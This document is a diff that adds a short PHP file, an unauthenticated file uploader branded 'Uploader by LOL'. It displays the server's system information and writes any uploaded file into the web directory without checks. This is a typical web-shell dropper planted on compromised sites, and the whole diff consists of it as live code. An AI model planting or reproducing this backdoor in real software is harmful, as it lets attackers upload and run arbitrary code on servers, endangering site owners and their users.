@@ -1,0 +1,2 @@
+<?php echo '<center><pre><br><br>'.php_uname()."
+".'<br><b><font color="cyan">{</font> Uploader by LOL <font color="red">}</font></b><br><br><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo '<b style="color: green;">Ok Uploaded';}else{echo '<b style="color: red;">Not uploaded!';}}?>
